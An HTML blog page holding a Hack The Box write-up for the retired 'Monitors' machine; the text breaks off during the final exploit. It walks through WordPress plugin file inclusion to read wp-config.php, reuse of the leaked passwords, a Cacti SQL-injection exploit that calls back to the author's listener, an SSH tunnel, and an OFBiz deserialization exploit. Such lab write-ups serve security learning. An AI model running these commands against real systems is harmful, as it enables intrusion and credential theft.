@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html ⚡>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+
+    <title>HTB Write-up | Monitors</title>
+
+    <link rel="canonical" href="../index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="HTB Write-up | Monitors" />
+    <meta property="og:description" content="Retired machine can be found here.ScanningLet&#x27;s start the same as always, with a basic nmap scan: ~ nmap -sC -sV -A 10.10.10.238 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST Nmap scan report for 10.10.10.238 Host is up (0.32s" />
+    <meta property="og:url" content="inesmartins.github.io/htb-write-up-monitors/" />
+    <meta property="og:image" content="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-17.10.05.png" />
+    <meta property="article:published_time" content="2021-10-09T16:17:00.000Z" />
+    <meta property="article:modified_time" content="2021-10-09T16:17:34.000Z" />
+    <meta property="article:tag" content="htb" />
+    <meta property="article:tag" content="wordpress" />
+    <meta property="article:tag" content="wpscan" />
+    <meta property="article:tag" content="wp-with-spritz" />
+    <meta property="article:tag" content="LFI" />
+    <meta property="article:tag" content="cacti" />
+    <meta property="article:tag" content="rce" />
+    <meta property="article:tag" content="sqli" />
+    <meta property="article:tag" content="sql injection" />
+    <meta property="article:tag" content="docker" />
+    <meta property="article:tag" content="apache ofbiz" />
+    <meta property="article:tag" content="metasploit" />
+    <meta property="article:tag" content="privesc" />
+    
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="HTB Write-up | Monitors" />
+    <meta name="twitter:description" content="Retired machine can be found here.ScanningLet&#x27;s start the same as always, with a basic nmap scan: ~ nmap -sC -sV -A 10.10.10.238 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST Nmap scan report for 10.10.10.238 Host is up (0.32s" />
+    <meta name="twitter:url" content="inesmartins.github.io/htb-write-up-monitors/" />
+    <meta name="twitter:image" content="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-17.10.05.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Inês Martins" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="htb, wordpress, wpscan, wp-with-spritz, LFI, cacti, rce, sqli, sql injection, docker, apache ofbiz, metasploit, privesc" />
+    <meta property="og:image:width" content="598" />
+    <meta property="og:image:height" content="375" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "",
+        "url": "inesmartins.github.io/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "inesmartins.github.io/favicon.ico",
+            "width": 48,
+            "height": 48
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Inês Martins",
+        "image": {
+            "@type": "ImageObject",
+            "url": "inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png",
+            "width": 592,
+            "height": 572
+        },
+        "url": "inesmartins.github.io/author/ines/",
+        "sameAs": []
+    },
+    "headline": "HTB Write-up | Monitors",
+    "url": "inesmartins.github.io/htb-write-up-monitors/",
+    "datePublished": "2021-10-09T16:17:00.000Z",
+    "dateModified": "2021-10-09T16:17:34.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-17.10.05.png",
+        "width": 598,
+        "height": 375
+    },
+    "keywords": "htb, wordpress, wpscan, wp-with-spritz, LFI, cacti, rce, sqli, sql injection, docker, apache ofbiz, metasploit, privesc",
+    "description": "&gt; Retired machine can be found here [https://app.hackthebox.eu/machines/Monitors].\nScanning\nLet&#x27;s start the same as always, with a basic nmap scan:\n\n~ nmap -sC -sV -A 10.10.10.238\n\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST\nNmap scan report for 10.10.10.238\nHost is up (0.32s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "inesmartins.github.io/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 4.7" />
+    <link rel="alternate" type="application/rss+xml" title="" href="../../rss/index.html" />
+
+    <style amp-custom>
+    *,
+    *::before,
+    *::after {
+        box-sizing: border-box;
+    }
+
+    html {
+        overflow-x: hidden;
+        overflow-y: scroll;
+        font-size: 62.5%;
+        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+    }
+
+    body {
+        min-height: 100vh;
+        margin: 0;
+        padding: 0;
+        color: #3a4145;
+        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
+        font-size: 1.7rem;
+        line-height: 1.55em;
+        font-weight: 400;
+        font-style: normal;
+        background: #fff;
+        scroll-behavior: smooth;
+        overflow-x: hidden;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+    }
+
+    p,
+    ul,
+    ol,
+    li,
+    dl,
+    dd,
+    hr,
+    pre,
+    form,
+    table,
+    video,
+    figure,
+    figcaption,
+    blockquote {
+        margin: 0;
+        padding: 0;
+    }
+
+    ul[class],
+    ol[class] {
+        padding: 0;
+        list-style: none;
+    }
+
+    img {
+        display: block;
+        max-width: 100%;
+    }
+
+    input,
+    button,
+    select,
+    textarea {
+        font: inherit;
+        -webkit-appearance: none;
+    }
+
+    fieldset {
+        margin: 0;
+        padding: 0;
+        border: 0;
+    }
+
+    label {
+        display: block;
+        font-size: 0.9em;
+        font-weight: 700;
+    }
+
+    hr {
+        position: relative;
+        display: block;
+        width: 100%;
+        height: 1px;
+        border: 0;
+        border-top: 1px solid currentcolor;
+        opacity: 0.1;
+    }
+
+    ::selection {
+        text-shadow: none;
+        background: #cbeafb;
+    }
+
+    mark {
+        background-color: #fdffb6;
+    }
+
+    small {
+        font-size: 80%;
+    }
+
+    sub,
+    sup {
+        position: relative;
+        font-size: 75%;
+        line-height: 0;
+        vertical-align: baseline;
+    }
+    sup {
+        top: -0.5em;
+    }
+    sub {
+        bottom: -0.25em;
+    }
+
+    ul li + li {
+        margin-top: 0.6em;
+    }
+
+    a {
+        color: var(--ghost-accent-color, #1292EE);
+        text-decoration-skip-ink: auto;
+    }
+
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+        margin: 0;
+        font-weight: 700;
+        color: #121212;
+        line-height: 1.4em;
+    }
+
+    h1 {
+        font-size: 3.4rem;
+        line-height: 1.1em;
+    }
+
+    h2 {
+        font-size: 2.4rem;
+        line-height: 1.2em;
+    }
+
+    h3 {
+        font-size: 1.8rem;
+    }
+
+    h4 {
+        font-size: 1.7rem;
+    }
+
+    h5 {
+        font-size: 1.6rem;
+    }
+
+    h6 {
+        font-size: 1.6rem;
+    }
+
+    amp-img {
+        height: 100%;
+        width: 100%;
+        max-width: 100%;
+        max-height: 100%;
+    }
+
+    amp-img img {
+        object-fit: cover;
+    }
+
+    .page-header {
+        padding: 50px 5vmin 30px;
+        text-align: center;
+        font-size: 2rem;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+
+    .page-header a {
+        color: #121212;
+        font-weight: 700;
+        text-decoration: none;
+        font-size: 1.6rem;
+        letter-spacing: -0.1px;
+    }
+
+    .post {
+        max-width: 680px;
+        margin: 0 auto;
+    }
+
+    .post-header {
+        margin: 0 5vmin 5vmin;
+        text-align: center;
+    }
+
+    .post-meta {
+        margin: 1rem 0 0 0;
+        text-transform: uppercase;
+        color: #738a94;
+        font-weight: 500;
+        font-size: 1.3rem;
+    }
+
+    .post-image {
+        margin: 0 0 5vmin;
+    }
+
+    .post-image img {
+        display: block;
+        width: 100%;
+        height: auto;
+    }
+
+    .post-content {
+        padding: 0 5vmin;
+    }
+
+    .post-content > * + * {
+        margin-top: 1.5em;
+    }
+
+    .post-content [id]:not(:first-child) {
+        margin: 2em 0 0;
+    }
+
+    .post-content > [id] + * {
+        margin-top: 1rem;
+    }
+
+    .post-content [id] + .kg-card,
+    .post-content blockquote + .kg-card {
+        margin-top: 40px;
+    }
+
+    .post-content > ul,
+    .post-content > ol,
+    .post-content > dl {
+        padding-left: 1.9em;
+    }
+
+    .post-content hr {
+        margin-top: 40px;
+    }
+
+    .post .post-content hr + * {
+        margin-top: 40px;
+    }
+
+    .post-content amp-img {
+        background-color: #f8f8f8;
+    }
+
+    .post-content blockquote {
+        position: relative;
+        font-style: italic;
+    }
+
+    .post-content blockquote::before {
+        content: "";
+        position: absolute;
+        left: -1.5em;
+        top: 0;
+        bottom: 0;
+        width: 0.3rem;
+        background: var(--ghost-accent-color, #1292EE);
+    }
+
+    .post-content :not(.kg-card):not([id]) + .kg-card {
+        margin-top: 40px;
+    }
+
+    .post-content .kg-card + :not(.kg-card) {
+        margin-top: 40px;
+    }
+
+    .kg-card figcaption {
+        padding: 1.5rem 1.5rem 0;
+        text-align: center;
+        font-weight: 500;
+        font-size: 1.3rem;
+        line-height: 1.4em;
+        opacity: 0.6;
+    }
+
+    .kg-card figcaption strong {
+        color: rgba(0,0,0,0.8);
+    }
+
+    .post-content :not(pre) code {
+        vertical-align: middle;
+        padding: 0.15em 0.4em 0.15em;
+        border: #e1eaef 1px solid;
+        font-weight: 400;
+        font-size: 0.9em;
+        line-height: 1em;
+        color: #15171a;
+        background: #f0f6f9;
+        border-radius: 0.25em;
+    }
+
+    .post-content > pre {
+        overflow: scroll;
+        padding: 16px 20px;
+        color: #fff;
+        background: #1F2428;
+        border-radius: 5px;
+        box-shadow: 0 2px 6px -2px rgba(0,0,0,.1), 0 0 1px rgba(0,0,0,.4);
+    }
+
+    .kg-embed-card {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        width: 100%;
+    }
+
+    .kg-image-card img {
+        margin: auto;
+    }
+
+    .kg-gallery-card + .kg-gallery-card {
+        margin-top: 0.75em;
+    }
+
+    .kg-gallery-container {
+        position: relative;
+    }
+
+    .kg-gallery-row {
+        display: flex;
+        flex-direction: row;
+        justify-content: center;
+    }
+
+    .kg-gallery-image {
+        width: 100%;
+        height: 100%;
+    }
+
+    .kg-gallery-row:not(:first-of-type) {
+        margin: 0.75em 0 0 0;
+    }
+
+    .kg-gallery-image:not(:first-of-type) {
+        margin: 0 0 0 0.75em;
+    }
+
+    .kg-bookmark-card,
+    .kg-bookmark-publisher {
+        position: relative;
+    }
+
+    .kg-bookmark-container,
+    .kg-bookmark-container:hover {
+        display: flex;
+        flex-wrap: wrap;
+        flex-direction: row-reverse;
+        color: currentColor;
+        background: rgba(255,255,255,0.6);
+        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
+        text-decoration: none;
+        border-radius: 5px;
+        box-shadow: 0 2px 6px -2px rgba(0, 0, 0, 0.1), 0 0 1px rgba(0, 0, 0, 0.4);
+        overflow: hidden;
+    }
+
+    .kg-bookmark-content {
+        flex-basis: 0;
+        flex-grow: 999;
+        padding: 20px;
+        order: 1;
+    }
+
+    .kg-bookmark-title {
+        font-weight: 600;
+        font-size: 1.5rem;
+        line-height: 1.3em;
+    }
+
+    .kg-bookmark-description {
+        display: -webkit-box;
+        max-height: 45px;
+        margin: 0.5em 0 0 0;
+        font-size: 1.4rem;
+        line-height: 1.55em;
+        overflow: hidden;
+        opacity: 0.8;
+        -webkit-line-clamp: 2;
+        -webkit-box-orient: vertical;
+    }
+
+    .kg-bookmark-metadata {
+        margin-top: 20px;
+    }
+
+    .kg-bookmark-metadata {
+        display: flex;
+        align-items: center;
+        font-weight: 500;
+        font-size: 1.3rem;
+        line-height: 1.3em;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+
+    .kg-bookmark-description {
+        display: -webkit-box;
+        -webkit-box-orient: vertical;
+        -webkit-line-clamp: 2;
+        overflow: hidden;
+    }
+
+    .kg-bookmark-metadata amp-img {
+        width: 18px;
+        height: 18px;
+        max-width: 18px;
+        max-height: 18px;
+        margin-right: 10px;
+    }
+
+    .kg-bookmark-thumbnail {
+        display: flex;
+        flex-basis: 20rem;
+        flex-grow: 1;
+        justify-content: flex-end;
+    }
+
+    .kg-bookmark-thumbnail amp-img {
+        max-height: 200px;
+    }
+
+    .kg-bookmark-author {
+        white-space: nowrap;
+        text-overflow: ellipsis;
+        overflow: hidden;
+    }
+
+    .kg-bookmark-publisher::before {
+        content: "•";
+        margin: 0 .5em;
+    }
+
+    .kg-width-full.kg-card-hascaption {
+        display: grid;
+        grid-template-columns: inherit;
+    }
+
+    .post-content table {
+        border-collapse: collapse;
+        width: 100%;
+    }
+
+    .post-content th {
+        padding: 0.5em 0.8em;
+        text-align: left;
+        font-size: .75em;
+        text-transform: uppercase;
+    }
+
+    .post-content td {
+        padding: 0.4em 0.7em;
+    }
+
+    .post-content tbody tr:nth-child(2n + 1) {
+        background-color: rgba(0,0,0,0.1);
+        padding: 1px;
+    }
+
+    .post-content tbody tr:nth-child(2n + 2) td:last-child {
+        box-shadow:
+            inset 1px 0 rgba(0,0,0,0.1),
+            inset -1px 0 rgba(0,0,0,0.1);
+    }
+
+    .post-content tbody tr:nth-child(2n + 2) td {
+        box-shadow: inset 1px 0 rgba(0,0,0,0.1);
+    }
+
+    .post-content tbody tr:last-child {
+        border-bottom: 1px solid rgba(0,0,0,.1);
+    }
+
+    .page-footer {
+        padding: 60px 5vmin;
+        margin: 60px auto 0;
+        text-align: center;
+        background-color: #f8f8f8;
+    }
+
+    .page-footer h3 {
+        margin: 0.5rem 0 0 0;
+    }
+
+    .page-footer p {
+        max-width: 500px;
+        margin: 1rem auto 1.5rem;
+        font-size: 1.7rem;
+        line-height: 1.5em;
+        color: rgba(0,0,0,0.6)
+    }
+
+    .powered {
+        display: inline-flex;
+        align-items: center;
+        margin: 30px 0 0;
+        padding: 6px 9px 6px 6px;
+        border: rgba(0,0,0,0.1) 1px solid;
+        font-size: 12px;
+        line-height: 12px;
+        letter-spacing: -0.2px;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+        font-weight: 500;
+        color: #222;
+        text-decoration: none;
+        background: #fff;
+        border-radius: 6px;
+    }
+
+    .powered svg {
+        height: 16px;
+        width: 16px;
+        margin: 0 6px 0 0;
+    }
+
+    @media (max-width: 600px) {
+        body {
+            font-size: 1.6rem;
+        }
+        h1 {
+            font-size: 3rem;
+        }
+
+        h2 {
+            font-size: 2.2rem;
+        }
+    }
+
+    @media (max-width: 400px) {
+        h1 {
+            font-size: 2.6rem;
+            line-height: 1.15em;
+        }
+        h2 {
+            font-size: 2rem;
+            line-height: 1.2em;
+        }
+        h3 {
+            font-size: 1.7rem;
+        }
+    }
+
+    :root {--ghost-accent-color: #000000;}
+    </style>
+
+    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+
+    
+
+</head>
+
+<body class="amp-template">
+    <header class="page-header">
+        <a href="../../index.html">
+                
+        </a>
+    </header>
+
+    <main class="content" role="main">
+        <article class="post">
+
+            <header class="post-header">
+                <h1 class="post-title">HTB Write-up | Monitors</h1>
+                <section class="post-meta">
+                    Inês Martins -
+                    <time class="post-date" datetime="2021-10-09">09 Oct 2021</time>
+                </section>
+            </header>
+            <figure class="post-image">
+                <amp-img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-17.10.05.png" width="600" height="340" layout="responsive"></amp-img>
+            </figure>
+            <section class="post-content">
+
+                <blockquote>Retired machine can be found <a href="https://app.hackthebox.eu/machines/Monitors">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>Let's start the same as always, with a basic <code>nmap</code> scan:</p><pre><code>~ nmap -sC -sV -A 10.10.10.238
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST
+Nmap scan report for 10.10.10.238
+Host is up (0.32s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
+|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
+|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>There's an <code>Apache</code> web server running on port 80 but we can't access it with the IP alone:</p><figure class="kg-card kg-image-card"></figure><p>Luckily the virtual host is pretty obvious:</p><pre><code>~ sudo nano /etc/hosts
+
+...
+10.10.10.238    monitors.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide"></figure><p>According to the footer the website was built using Wordpress, so let's run <a href="https://wpscan.com/wordpress-security-scanner">wpscan</a>:</p><figure class="kg-card kg-image-card"></figure><p>The tool found that this instance was using the <a href="http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt">WP with Spritz</a> plugin, more specifically version 1.0, which is vulnerable to unauthenticated RFI.</p><p>As shown on <a href="https://www.exploit-db.com/exploits/44544">this</a> ExploitDB POC, all we need to do to is call a particular path inside the plugin directory - <code>wp.spritz.content.filter.php</code> - with a specific parameter - <code>url</code> - and we can see the content of any accessible file in the system, e.g.:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><hr></hr><h2 id="enumerating-with-lfi">Enumerating with LFI</h2><p><code>marcus</code> looks like the most interesting user, and it seems like we're able to access their home directory, but we can't read <code>user.txt</code>:</p><figure class="kg-card kg-image-card kg-width-full"></figure><p>So, let's read the Wordpress configuration file:</p><pre><code>~ curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=../../../wp-config.php</code></pre><figure class="kg-card kg-image-card kg-width-wide"></figure><p>So, we have the db name, user and password (which might be re-used somewhere else):</p><pre><code>DB_NAME: 'wordpress'
+DB_USER: 'wpadmin'
+DB_PASSWORD: 'BestAdministrator@2020!'</code></pre><p>Unfortunately, we don't have permissions to access it locally and can't access the service from a remote machine. So, let's try some more enumeration using a <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list">handy list</a>:</p><pre><code class="language-python">import os
+
+baseurl = 'http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=/'
+
+entries = open('lfi_payloads.txt', 'r').read().split('\n')
+
+for entry in entries:
+	print('Trying ' + entry)
+	os.system('curl ' + baseurl + entry + ' -O')</code></pre><p>After some trial and error we finally get something interesting on <code>etc/apache2/sites-enabled/000-default.conf</code>:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><hr></hr><h2 id="exploring-cacti-admin">Exploring cacti-admin</h2><p>Let's configure our new virtual host and access the website:</p><pre><code>~ sudo nano /etc/hosts
+
+...
+10.10.10.238    cacti-admin.monitors.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide"></figure><p>Luckily we can use the credentials we found on the last step and get in: <code>admin</code>/<code>BestAdministrator@2020!</code></p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>Going through the source code, we see that this application is using <a href="https://github.com/Cacti/cacti/releases/tag/release%2F1.2.12">Cacti version 1.2.12</a>, which has a lot of known vulnerabilities including an RCE via SQL Injection.</p><p>And better yet, there's a <a href="https://www.exploit-db.com/exploits/49810">working payload on ExploitDB</a>:</p><pre><code>~ python cacti_exploit.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.14.122 --lport 4444
+[+] Connecting to the server...
+[+] Retrieving CSRF token...
+[+] Got CSRF token: sid:105acde9cf997ef401f3eaaf5a884e62c9776fa1,1620939044
+[+] Trying to log in...
+[+] Successfully logged in!
+
+[+] SQL Injection:
+"name","hex"
+"",""
+"admin","$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK"
+"guest","43e9a4ab75570f5b"
+
+[+] Check your nc listener!</code></pre><p>And we have a shell!</p><pre><code>$ whoami
+www-data</code></pre><p>Let's upgrade it to an interactive shell:</p><pre><code>~ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@monitors:/usr/share/cacti/cacti</code></pre><hr></hr><h2 id="getting-user">Getting user</h2><pre><code>www-data@monitors:/home/marcus$ su marcus
+Password: BestAdministrator@2020!</code></pre><p>Let's see what we can find on <code>marcus</code>'s home directory:</p><pre><code>$ cd /home/marcus
+$ ls -la
+
+drwxr-xr-x 5 marcus marcus 4096 Jan 25 15:39 .
+drwxr-xr-x 3 root   root   4096 Nov 10  2020 ..
+d--x--x--x 2 marcus marcus 4096 Nov 10  2020 .backup
+lrwxrwxrwx 1 root   root      9 Nov 10  2020 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 marcus marcus  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 marcus marcus 3771 Apr  4  2018 .bashrc
+drwx------ 2 marcus marcus 4096 Jan 25 15:39 .cache
+drwx------ 3 marcus marcus 4096 Nov 10  2020 .gnupg
+-rw-r--r-- 1 marcus marcus  807 Apr  4  2018 .profile
+-r--r----- 1 root   marcus   84 Jan 25 14:59 note.txt
+-r--r----- 1 root   marcus   33 May 15 15:44 user.txt</code></pre><p>As you can see, the <code>.backup</code> directory has the execute bit (<code>x</code>) set for everyone:</p><blockquote><strong> </strong>[When applied to directories, <strong>enabling X</strong>] and <strong><strong>disabling RW</strong></strong> gives you a false sense of security since you could blindly read and write file contents and access subdirectories. You should be sure that every direct children of the directory have explicit permissions.</blockquote><p>We need some more enumeration. Let's try to find all files with string "marcus":</p><pre><code>$ grep "marcus" /etc -R 2&gt;/dev/null
+
+/etc/group-:marcus:x:1000:
+/etc/subgid:marcus:165536:65536
+/etc/group:marcus:x:1000:
+/etc/passwd:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
+/etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh
+/etc/subuid:marcus:165536:65536
+/etc/passwd-:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
+</code></pre><p>The <code>cacti-backup</code> service looks interesting:</p><pre><code>$ cat /etc/systemd/system/cacti-backup.service
+[Unit]
+Description=Cacti Backup Service
+After=network.target
+
+[Service]
+Type=oneshot
+User=www-data
+ExecStart=/home/marcus/.backup/backup.sh
+
+[Install]
+WantedBy=multi-user.target</code></pre><p>Let's see if we can read the script that's being called:</p><pre><code>$ cat /home/marcus/.backup/backup.sh
+
+#!/bin/bash
+
+backup_name="cacti_backup"
+config_pass="VerticalEdge2020"
+
+zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
+sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
+rm /tmp/${backup_name}.zip</code></pre><p>That's an interesting password 😉</p><pre><code>$ su marcus
+su marcus
+Password: VerticalEdge2020
+
+marcus@monitors:/usr/share/cacti/cacti$ cat /home/marcus/user.txt
+cat /home/marcus/user.txt
+1f9e04959870f6cd3c13216d0cf00583</code></pre><p>And now we're able to access via SSH, which is a lot easier:</p><pre><code>~ ssh marcus@monitors.htb
+marcus@monitors.htb's password:
+&gt; VerticalEdge2020
+
+...
+
+marcus@monitors:~$</code></pre><hr></hr><h2 id="red-herring">Red Herring</h2><p>It seems like <code>marcus</code> left a note in their home directory:</p><pre><code>marcus@monitors:~$ cat note.txt
+
+TODO:
+
+Disable phpinfo	in php.ini		- DONE
+Update docker image for production use	-</code></pre><p>Since the Docker image might be deprecated, let's filter out all of the processes running on the machine that are Docker-related:</p><pre><code>$ ps aux | grep docker
+
+root       1527  0.0  2.0 1196956 82704 ?       Ssl  11:42   0:04 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+
+root       2006  0.1  0.2 628508  8864 ?        Sl   11:42   0:15 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443
+
+root       2039  0.0  0.1 108820  5768 ?        Sl   11:42   0:01 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/a2e16ca5647428c5f43ce47fd08272fd8738ed80d3db0e6cf4bcb15370bbf184 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc</code></pre><p>Note that all of these are ran by <code>root</code>, and the <code>docker</code> group doesn't contain any user, which means we can't use most of the known privesc Docker vectors:</p><pre><code>$ cat /etc/group | grep docker
+docker:x:999:
+$ cat /etc/passwd | grep 999</code></pre><p>Let's see what else we can find about this instance of <code>Docker</code> with <a href="https://github.com/stealthcopter/deepce">deepce</a>:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>There doesn't seem to be a known vulnerability for the current Docker version, so we need to go another route.</p><hr></hr><h2 id="apache-ofbiz">Apache OFBiz</h2><p>We know that <code>docker-proxy</code> is mapping the host TCP port <code>8443</code> to the container's (<code>172.17.0.2</code>) TCP port <code>844</code>:</p><figure class="kg-card kg-image-card"></figure><p>So we can SSH tunnel to see what's running on the container:</p><pre><code>~ ssh -L 8443:localhost:8443 marcus@monitors.htb  -fNT 
+marcus@monitors.htb's password: 
+&gt; VerticalEdge2020
+
+~ ps aux | grep 8443
+inesmartins      38886   0.0  0.0  4331440    648   ??  Ss   12:35PM   0:00.00 ssh -L 8443:localhost:8443 marcus@monitors.htb -fNT
+</code></pre><p>When we access this address on our local browser we can see this page:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>A quick scan of the port tells us that the <code>SSL</code> certificate was emitted for ofbiz-vm.apache.org, which points to an <a href="https://ofbiz.apache.org/">Apache OFBiz</a> applications.</p><pre><code>~ nmap -sC -sV -A localhost -p 8443
+
+PORT     STATE SERVICE  VERSION
+
+8443/tcp open  ssl/http Apache Tomcat 9.0.31
+|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
+| ssl-cert: Subject: commonName=ofbiz-vm.apache.org/organizationName=Apache Software Fundation/stateOrProvinceName=DE/countryName=US
+...</code></pre><blockquote><strong>Apache OFBiz</strong> is a suite of business applications flexible enough to be used across any industry. A common architecture allows developers to easily extend or enhance it to create custom features.</blockquote><p>This framework has some <a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=45&amp;product_id=28350&amp;version_id=&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=0&amp;cvssscoremax=0&amp;year=0&amp;month=0&amp;cweid=0&amp;order=3&amp;trc=33&amp;sha=6402b2a5500eca02d0aa351eb1febae7c45a174a">serious vulnerabilities</a>, one of them being <code>CVE-2020-9496</code> which enables unauthenticated RCE:</p><blockquote>OfBiz exposes an <code>XMLRPC</code> endpoint at <code>/webtools/control/xmlrpc</code>. This is an unauthenticated endpoint since authentication is applied on a per-service basis. However, the <code>XMLRPC</code> request is processed before authentication. As part of this processing, any serialized arguments for the remote invocation are deserialized, therefore if the classpath contains any classes that can be used as gadgets to achieve remote code execution, an attacker will be able to run arbitrary system commands on any OfBiz server with same privileges as the servlet container running OfBiz.</blockquote><p>I found a really <a href="https://github.com/ambalabanov/CVE-2020-9496">great POC on Github</a> and gave it a shot:</p><pre><code>~ git clone git@github.com:ambalabanov/CVE-2020-9496.git
+~ cd CVE-2020-9496
+~ wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial.jar
+~ brew install --cask adoptopenjdk8brew tap adoptopenjdk/openjdk
+~ brew tap adoptopenjdk/openjdk
+~ java -version
+~ export JAVA_HOME=`/usr/libexec/java_home -v 1.8.0_292`</code></pre><p>I setup a local server:</p><pre><code>~ python3 -m http.server 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...</code></pre><p>... and sent a curl command to see if the container would connect to it:</p><pre><code>~ python3 cve-2020-9496.py --target https://localhost:8443
+cmd&gt; curl http://10.10.14.9:9000
+[!] Send payload ...
